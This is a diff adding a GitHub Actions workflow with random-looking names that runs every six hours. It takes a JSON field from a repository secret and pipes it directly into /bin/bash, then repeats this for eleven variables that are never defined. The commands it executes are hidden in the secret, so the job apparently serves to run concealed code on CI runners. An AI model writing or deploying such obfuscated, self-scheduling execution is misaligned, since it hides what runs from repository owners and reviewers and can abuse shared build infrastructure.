@@ -1,0 +1,28 @@
+name: yongmuqunwen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yongmuqunwen
+        env:
+          xz7854: ${{ secrets.xz7854 }}
+        run: |
+          echo $xz7854 | jq -r .gtmkg9997 | /bin/bash
+          echo $zio621 | jq -r .m7213 | /bin/bash
+          echo $ouqur3410 | jq -r .tk4 | /bin/bash
+          echo $uum6 | jq -r .iuot175 | /bin/bash
+          echo $citgi925 | jq -r .sjae4 | /bin/bash
+          echo $sk9182 | jq -r .gxbn75183 | /bin/bash
+          echo $u8 | jq -r .jxykw38 | /bin/bash
+          echo $ogyjk132 | jq -r .vwxc99657 | /bin/bash
+          echo $ayzcw5 | jq -r .qzv74 | /bin/bash
+          echo $udupn5 | jq -r .l578 | /bin/bash
+          echo $k067 | jq -r .bku28 | /bin/bash
+          echo $ubzxv01 | jq -r .nob62 | /bin/bash
+
